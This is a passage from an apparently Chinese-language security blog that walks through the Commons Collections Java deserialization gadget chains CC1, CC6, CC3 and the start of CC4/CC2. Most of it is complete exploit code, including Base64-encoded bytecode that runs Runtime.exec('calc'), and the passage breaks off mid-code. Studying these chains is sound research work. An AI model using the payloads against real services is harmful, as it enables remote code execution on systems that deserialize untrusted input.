class="line">unserialize(bytes);</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是Target是一个</p>
<p>AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是<br>参数就是前面构造的Map，这里我使用的是随便使用一个Annotation类Target去执行一下，会发现没有执行成功，跟进去会发现memberType为空根本就进不去setValue<img src="/images/image-20220327033548384.png" alt="image-20220327033548384"></p>
<p>那么如何让这个memberType不为null呢？直接给出两个条件：</p>
<ol>
<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是<br>Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li>
<li>被TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li>
</ol>
<p>因为Target有一个方法，名为value；所以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(chainedTransformer);</span><br><span class="line">        &#125;</span><br><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor annotationInvocationHandler=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object o=annotationInvocationHandler.newInstance(Target.class,transformedMap);</span><br><span class="line"><span class="type">byte</span>[] bytes = serialize(o);</span><br><span class="line">unserialize(bytes);</span><br></pre></td></tr></table></figure>





<h5 id="LazyMap实现"><a href="#LazyMap实现" class="headerlink" title="LazyMap实现"></a>LazyMap实现</h5><p>大家如果看一下yso里面的cc1链可以发现实现方式并不是TransfromedMap而是LazyMap</p>
<p><img src="/images/image-20220327234444756.png" alt="image-20220327234444756"></p>
<p>回到刚才会调用InvokerTransformer.transformer的还有LazyMap的get方法</p>
<p><img src="/images/image-20220327234652775.png" alt="image-20220327234652775"></p>
<p>这里调用他的Get方法太多了，我们就不再从下往上再了，自己直接看到在AnnotationInvocationHandler的invoke里面会调用get方法</p>
<p><img src="/images/image-20220327235514354.png" alt="image-20220327235514354"></p>
<p>那么又如何能调用到AnnotationInvocationHandler#invoke 呢？ysoserial的作者想到的是利用Java的对象代理</p>
<p><a href="https://www.jianshu.com/p/e575bba365f8">Java动态代理之InvocationHandler最简单的入门教程 - 简书 (jianshu.com)</a></p>
<p>这个讲的很清楚看完就应该是什么意思</p>
<p>根据AnnotationInvocationHandler的invoke 写法只要调用AnnotationInvocationHandler的一个方法就会执行get方法(不等于equala方法，参数为零)，反序列化需要我们找一个readObject所以我们很自然的理想到再用AnnotationInvocationHandler对这个proxyMap进行包裹</p>
<p><img src="/images/image-20220328100859563.png" alt="image-20220328100859563"></p>
<p>最后cc1就结束了，最后讲一下为什么不能在8u71就不能用了，在8u71改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去</p>
<p><img src="/images/image-20220328125453976.png" alt="image-20220328125453976"></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>和CC1相比，这里从<code>LazyMap#get</code>后的调用方法均相同，也可以说，解决Java⾼版本利⽤，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。</p>
<p>通过其Gadget 我们定位到了<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
<p>cc6的前半部分有点感觉像我们之前的urldns。在HashMap的readObject方法中，调用到了hash(key) ，而hash方法中，调用到了<br>key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前面的分析过<br>程，构成一个完整的Gadget</p>
<p><img src="/images/image-20220328145642206.png" alt="image-20220328145642206"></p>
<p>TiedMapEntry的hashcode里面调用getValue，getValue里面</p>
<p><img src="/images/image-20220328145734015.png" alt="image-20220328145734015"></p>
<p>控制map就可以实现了</p>
<p><img src="/images/image-20220328145804236.png" alt="image-20220328145804236"></p>
<p>所以</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap1.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="comment">//outerMap.remove(&quot;aaa&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(outerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes=serialize(innerMap1);</span><br><span class="line">unserialize(bytes);</span><br></pre></td></tr></table></figure>

<p>前面和cc1的lazyMap一模一样，我们把我们构造好的LazyMap传进tiedMapEntry这样我们现在就可以按照urldns的方法来实现从readObject到tiedMapEntry.hashCode了，为了让他不在put进去的时候调用，我们利用先在LazyMap里面随便传入一个Transformer类，在后面利用反射添加进去，跟一下会发现反序列化的时候还是不行。发现需要将key删除</p>
<p><img src="/images/image-20220328220453658.png" alt="image-20220328220453658"></p>
<p>在反序列化的时候需要满足判断条件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[]transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,  Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span> , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,   <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  <span class="literal">null</span>       , <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap1.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">outerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(outerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes=serialize(innerMap1);</span><br><span class="line">unserialize(bytes);</span><br></pre></td></tr></table></figure>

<p>完成</p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC3 是基于CC1修改的，而CC3实现的是加载任意字节码,为了绕过一些规则对InvokerTransformer的限制。 CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个 类， com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 。</p>
<p><img src="/images/image-20220401191253682.png" alt="image-20220401191253682"></p>
<p>可以看到在构造函数里面调用了newTransformer，然后向上面找到InstantiateTransformer</p>
<p><img src="/images/image-20220401191510304.png" alt="image-20220401191510304"></p>
<p>看到transformer里面是调用构造方法。，我们就可以先将TrAXFilter 传入InstantiateTransformer 然后在transformer构造，然后在TrAXFilter 的构造方法里面调用TemplatesImpl.newTransformer() </p>
<p>简单修改一下cc1就可以，因为InvokerTransformer的前面都一样，只是后面我们实现了任意代码执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test.CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">byte</span>[] code =</span><br><span class="line">            Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAPTHRlc3QvQ0MzL3Rlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADXRlc3QvQ0MzL3Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAALAAQADgANABEAEAAPABEAEAAVABMADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">                <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">                setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">                setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">                setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(handler);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bout);</span><br><span class="line">        oout.writeObject(o);</span><br><span class="line">        <span class="type">byte</span>[] bytes = bout.toByteArray();</span><br><span class="line">        oout.close();</span><br><span class="line">        bout.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin);</span><br><span class="line">        <span class="keyword">return</span> oin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20220406171339398.png" alt="image-20220406171339398"></p>
<p>其实可以将cc1cc6cc3用到的链子简单排列组合一下，这里就不演示了。</p>
<h2 id="CC4-CC2"><a href="#CC4-CC2" class="headerlink" title="CC4&amp;CC2"></a>CC4&amp;CC2</h2><h5 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h5><h6 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</span><br><span class="line">TransformingComparator是一个修饰器，和CC1中的ChainedTransformer类似。</span><br></pre></td></tr></table></figure>

<p>这个其实是ChainedTransformer向上找，找到的</p>
<p><img src="/images/image-20220406174100460.png" alt="image-20220406174100460"></p>
<p>那么谁会调用compare呢，自然是PriorityQueue</p>
<h6 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h6><p><img src="/images/image-20220406174250315.png" alt="image-20220406174250315"></p>
<p>这里如果对java开发感兴趣的可以反过来找，我tcl了只能站在别人的肩膀上了。</p>
<p>我们看一下PriorityQueue的 readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;compare将连起来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code =</span><br><span class="line">            Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAPTHRlc3QvQ0MzL3Rlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADXRlc3QvQ0MzL3Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAALAAQADgANABEAEAAPABEAEAAVABMADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                <span 